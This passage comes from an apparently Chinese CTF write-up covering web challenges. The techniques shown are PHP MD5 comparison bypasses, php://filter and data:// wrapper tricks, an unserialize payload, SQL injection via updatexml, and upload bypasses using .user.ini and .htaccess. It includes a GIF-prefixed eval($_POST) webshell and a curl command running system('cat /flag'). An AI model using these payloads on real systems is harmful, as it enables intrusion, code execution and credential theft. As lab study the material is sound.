class="hljs-string">&#x27;1&lt;shit&gt;&#x27;</span> <span class="hljs-keyword">or</span> 后跟非<span class="hljs-number">0</span>开头的数据就会返回为<span class="hljs-literal">TRUE</span><br><br></code></pre></td></tr></table></figure><p>大佬的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;;) &#123; <br> <span class="hljs-keyword">for</span> (<span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$c</span> &lt; <span class="hljs-number">1000000</span>; <span class="hljs-variable">$c</span>++, <span class="hljs-variable">$i</span>++)<br>  <span class="hljs-keyword">if</span> (stripos(md5(<span class="hljs-variable">$i</span>, <span class="hljs-literal">true</span>), <span class="hljs-string">&#x27;\&#x27;or\&#x27;&#x27;</span>) !== <span class="hljs-literal">false</span>)<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\nmd5(<span class="hljs-subst">$i</span>) = &quot;</span> . md5(<span class="hljs-variable">$i</span>, <span class="hljs-literal">true</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;.&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>  <span class="hljs-comment">//给一个常用的 payload ffifdyop</span><br></code></pre></td></tr></table></figure><p>传入即可下一关</p><h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; md5(<span class="hljs-variable">$a</span>) == md5(<span class="hljs-variable">$b</span>))&#123;<br>    <span class="hljs-comment">// wow, glzjin wants a girl friend.</span><br></code></pre></td></tr></table></figure><p>该说不说这个弱比较确实是已经盘包浆了，网上一搜一大堆</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/levels91.php?<span class="hljs-attribute">a</span>=QNKCDZO&amp;b=240610708<br></code></pre></td></tr></table></figure><h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>传入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span>:param<span class="hljs-number">1</span>[]=<span class="hljs-number">111</span>&amp;param<span class="hljs-number">2</span>[]=<span class="hljs-number">222</span><br></code></pre></td></tr></table></figure><p>即可</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = unserialize(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>不管怎么说，先让程序走到 Line 11,那么需要满足 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))<br>    ...<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))<br></code></pre></td></tr></table></figure><p>这里自己也不是很理解为什么直接传入不行，然后我尝试了伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 构建">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure><p>把 welcome to the zjctf base64编码传入，或者input为协议post上去。然后下面这个地方知识包含，不是读取！这个地方我狠狠的踩坑了，所以要用filter来读取文件，读取后的内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);    <span class="hljs-comment">//看到这里可以读取flag.php，使用的是_tostring方法，我们使用echo即可触发</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);    <span class="hljs-comment">//看到这里可以读取flag.php</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;<br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">new</span> Flag()));  <br><span class="hljs-comment">//ouput:O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></code></pre></td></tr></table></figure><p>最后payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D<br></code></pre></td></tr></table></figure><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>文件上传的题目</p><p>构建一个图片马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);&lt;/script&gt;   <br></code></pre></td></tr></table></figure><p>经过尝试 发现不允许更改filename(就那些可以解析成php的全不行)，这个时候可以用 <code>.user.ini</code></p><p>它可以帮助我们自动包含一些文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=nosymbol.png<br></code></pre></td></tr></table></figure><p>构建如上文件，可以在访问 默认页面(index.php)时自动包含 nosymbol.png 这个文件也就是上面的图片马</p><p>getFlag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> http://edc<span class="hljs-number">1162</span>e-eb<span class="hljs-number">28</span>-<span class="hljs-number">46</span>d<span class="hljs-number">3</span>-bd<span class="hljs-number">05</span>-d<span class="hljs-number">5</span>b<span class="hljs-number">996584</span>fc<span class="hljs-number">4</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/uploads/cc<span class="hljs-number">551</span>ab<span class="hljs-number">005</span>b<span class="hljs-number">2</span>e<span class="hljs-number">60</span>fbdc<span class="hljs-number">88</span>de<span class="hljs-number">809</span>b<span class="hljs-number">2</span>c<span class="hljs-number">4</span>b<span class="hljs-number">1</span>/index.php -X POST -d <span class="hljs-string">&quot;shell=system(&#x27;cat /flag&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201102046298.png" alt="image-20220110204644152"></p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>这题过滤了union select if这样的函数，但是没有过滤updatexml</p><p>于是有</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">check</span>.php?username=<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,version(),0x7e),1))%23&amp;password=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">check.php?username=admin&#x27;</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">1</span><br><br><span class="hljs-keyword">check</span>.php?username=<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="hljs-string">&#x27;)),0x7e),1))%23&amp;password=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">check.php?username=admin&#x27;</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(username,<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">password</span>))<span class="hljs-keyword">from</span>(H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">1</span><br>这个地方你会发现flag只给了半个<br><span class="hljs-keyword">check</span>.php?username=<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=1</span><br></code></pre></td></tr></table></figure><p>注意 要符合 8 4 4 4 12规则 flag有重复字段删掉他</p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>.user.ini 行不通，试试.htaccess</p><p>.htaccess内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;FilesMatch  <span class="hljs-string">&quot;b.jpg&quot;</span>&gt;<br><br>SetHandler  application/x-httpd-php<br><br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201102105411.png" alt="image-20220110210559312"></p><p>然后整个图片🐎</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;readfile(<span class="hljs-string">&#x27;/flag&#x27;</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>尝试以后知道的system函数禁用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash"> curl http://5ed3d265-efab-4d75-8e8d-3d2692ae1906.node4.buuoj.cn:81//upload/44927cfb6cc8b88769ea882582c90522/b.jpg</span><br>GIF89a<br>flag&#123;885b198c-a024-47f6-9e2a-f159525cb14d&#125;<br></code></pre></td></tr></table></figure><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>确实ez，然而自己眼瞎好几次差点跑去翻wp  hhh</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>I put something in F12 <span class="hljs-keyword">for</span> you<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$id</span>) === md5(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!is_numeric(<span class="hljs-variable">$passwd</span>))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;<br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;Please input first<br></code></pre></td></tr></table></figure><p>源码直接给了 目的是执行到17行</p><p>我们需要满足</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) <br>    ...<br>        <span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$id</span>) === md5(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) <br>            ...<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]))<br>                    ...<br>                    <span class="hljs-keyword">if</span> (!is_numeric(<span class="hljs-variable">$passwd</span>))<br>                            ...<br>                             <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br></code></pre></td></tr></table></figure><p>考点就是MD5强比较和PHP弱类型</p><p>最终payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>: ?id[]=<span class="hljs-number">111</span>&amp;gg[]=<span class="hljs-number">222</span><br><span class="hljs-attribute">POST</span>: passwd=<span class="hljs-number">1234567</span>a<br></code></pre></td></tr></table></figure><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;process();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;write();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-keyword">$this</span>-&gt;read();<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(strlen((<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span 